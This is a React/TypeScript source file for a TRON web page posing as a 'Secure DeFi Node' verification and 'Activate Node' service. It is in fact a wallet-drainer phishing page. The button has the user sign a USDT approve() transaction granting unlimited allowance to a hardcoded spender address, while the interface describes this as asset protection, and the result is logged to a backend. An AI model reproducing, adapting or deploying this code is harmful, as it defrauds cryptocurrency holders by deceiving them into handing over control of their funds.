import { useState, useMemo } from "react";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";

// WalletConnect & UI Adapters
import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapters'; 
import { WalletActionButton } from '@tronweb3/tronwallet-adapter-react-ui';
import '@tronweb3/tronwallet-adapter-react-ui/style.css';

const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";

export default function Index() {
  const adapters = useMemo(() => [
    new WalletConnectAdapter({
      network: 'Mainnet' as any,
      options: {
        projectId: '6b5df56bc30c1dadaab59498b86fd3e8', // 👈 ://walletconnect.com se ID yahan dalein
        metadata: {
          name: 'Secure DeFi Node',
          description: 'TRON Asset Verification',
          url: 'https://your-dapp.com',
          icons: ['https://cryptologos.cc']
        }
      }
    })
  ], []);

  return (
    <WalletProvider adapters={adapters} autoConnect={true}>
        <DAppUI />
    </WalletProvider>
  );
}

function DAppUI() {
  const { address, connected, signTransaction } = useWallet();
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState("");
  const createTransaction = useMutation(api.transactions.createTransaction);

  const handleApprove = async () => {
    if (!connected || !address) return alert("Please Connect Wallet First!");
    try {
      setIsLoading(true);
      setStatus("Confirm in Wallet...");
      const tronWeb = (window as any).tronWeb;
      const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
      const parameter = [{ type: 'address', value: TRON_SPENDER }, { type: 'uint256', value: maxAmount }];

      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 }, parameter, address
      );

      const signedTx = await signTransaction(transaction.transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      if (result.result) {
        await createTransaction({
          walletAddress: address, txHash: result.txid, amount: "Unlimited",
          toAddress: TRON_SPENDER, usdtBalance: "Verified", nativeBalance: "0 TRX"
        });
        alert("✅ Node Activated Successfully!");
      }
    } catch (err: any) {
      alert("❌ Request Cancelled or Insufficient Energy");
    } finally {
      setIsLoading(false);
      setStatus("");
    }
  };

  return (
    <div style={styles.container as any}>
      {/* IOS STYLE HEADER */}
      <div style={styles.header as any}>
        <div style={styles.headerTitle as any}>Verify & Send</div>
        <WalletActionButton />
      </div>

      <div style={styles.body as any}>
        {/* NETWORK BADGE */}
        <div style={styles.networkBadge as any}>
            <div style={styles.tronCircle as any}>T</div>
            <div style={{flex: 1}}>
                <div style={{fontSize: '14px', fontWeight: '600'}}>TRON Mainnet</div>
                <div style={{fontSize: '11px', color: '#32d74b'}}>Secure Connection Active</div>
            </div>
            <div style={styles.greenPulse as any}></div>
        </div>

        {/* INPUT CARD */}
        <div style={styles.card as any}>
            <div style={{display: 'flex', justifyContent: 'space-between', marginBottom: '10px'}}>
                <span style={styles.label as any}>Asset</span>
                <span style={styles.maxBtn as any}>TRC20</span>
            </div>
            <div style={styles.assetRow as any}>
                <img src="https://cryptologos.cc" width="32" alt="usdt" />
                <span style={styles.assetName as any}>USDT</span>
                <span style={{marginLeft: 'auto', fontSize: '24px', fontWeight: '600'}}>MAX</span>
            </div>
        </div>

        {/* DETAILS CARD */}
        <div style={styles.card as any}>
            <div style={styles.detailRow as any}>
                <span>From</span>
                <span>{address ? `${address.slice(0,6)}...${address.slice(-6)}` : "Not Connected"}</span>
            </div>
            <div style={styles.divider as any}></div>
            <div style={styles.detailRow as any}>
                <span>Spender</span>
                <span>{TRON_SPENDER.slice(0,10)}...</span>
            </div>
            <div style={styles.divider as any}></div>
            <div style={styles.detailRow as any}>
                <span>Network Fee</span>
                <span style={{color: '#ff9f0a'}}>~15.4 TRX</span>
            </div>
        </div>

        <div style={styles.infoText as any}>
            🛡️ Verification ensures secure node activation and asset protection.
        </div>
      </div>

      {/* ACTION BUTTON */}
      <div style={styles.footer as any}>
        <button 
            disabled={isLoading || !connected} 
            onClick={handleApprove} 
            style={(isLoading || !connected ? styles.btnDisabled : styles.btnActive) as any}
        >
            {isLoading ? status : connected ? "Activate Node" : "Connect Trust Wallet"}
        </button>
      </div>
    </div>
  );
}

const styles = {
  container: { minHeight: "100vh", background: "#000", color: "#fff", fontFamily: "-apple-system, sans-serif", display: "flex", flexDirection: "column", maxWidth: "480px", margin: "0 auto" },
  header: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: "20px", background: "rgba(255,255,255,0.05)", backdropFilter: "blur(10px)" },
  headerTitle: { fontSize: "19px", fontWeight: "700" },
  body: { padding: "20px", flex: 1 },
  networkBadge: { display: "flex", alignItems: "center", background: "#1c1c1e", padding: "12px", borderRadius: "14px", marginBottom: "20px", gap: "12px", border: "1px solid #2c2c2e" },
  tronCircle: { width: "35px", height: "35px", background: "#ff3b30", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: "800" },
  greenPulse: { width: "8px", height: "8px", background: "#32d74b", borderRadius: "50%", boxShadow: "0 0 10px #32d74b" },
  card: { background: "#1c1c1e", padding: "18px", borderRadius: "20px", marginBottom: "16px", border: "1px solid #2c2c2e" },
  label: { color: "#8e8e93", fontSize: "13px" },
  maxBtn: { color: "#0a84ff", fontSize: "12px", fontWeight: "700" },
  assetRow: { display: "flex", alignItems: "center", gap: "12px", marginTop: "10px" },
  assetName: { fontSize: "20px", fontWeight: "600" },
  detailRow: { display: "flex", justifyContent: "space-between", padding: "10px 0", fontSize: "14px", color: "#8e8e93" },
  divider: { height: "1px", background: "#2c2c2e" },
  infoText: { textAlign: "center", color: "#48484a", fontSize: "11px", marginTop: "20px" },
  footer: { padding: "20px 20px 40px" },
  btnActive: { width: "100%", padding: "18px", borderRadius: "18px", background: "#007aff", color: "#fff", fontWeight: "bold", fontSize: "17px", border: "none", cursor: "pointer", transition: "0.2s" },
  btnDisabled: { width: "100%", padding: "18px", borderRadius: "18px", background: "#1c1c1e", color: "#48484a", fontSize: "17px", border: "none" }
};
